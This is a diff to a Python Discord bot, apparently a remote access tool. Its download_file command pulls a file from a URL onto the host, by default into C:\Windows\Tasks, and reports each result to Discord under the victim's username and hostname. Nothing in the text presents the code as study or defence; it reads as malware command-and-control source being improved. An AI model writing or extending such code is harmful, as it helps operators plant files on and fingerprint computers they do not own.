@@ -90,7 +90,7 @@ async def download_file(ctx, url: str = None, *, save_path: str = None):
         return
 
     if save_path is None:
-        save_path = r'C:\Windows\Tasks'
+        save_path = r'C:\\Windows\\Tasks'
     
     # Ensure the save path directory exists
     os.makedirs(save_path, exist_ok=True)
@@ -101,9 +101,11 @@ async def download_file(ctx, url: str = None, *, save_path: str = None):
         full_path = os.path.join(save_path, filename)
         with open(full_path, 'wb') as f:
             f.write(response.content)
-        await ctx.send(f"File downloaded to {full_path}")
+        embed = discord.Embed(title=f"{getpass.getuser()}@{socket.gethostname()}", description=f'```File downloaded to {full_path}```')
+        await ctx.send(embed=embed)
     else:
-        await ctx.send("Failed to download the file from the web.")
+        embed = discord.Embed(title=f"{getpass.getuser()}@{socket.gethostname()}", description=f'```Failed to download the file from the web.```')
+        await ctx.send(embed=embed)
 
 
 async def send_msg(channel, title, msg):
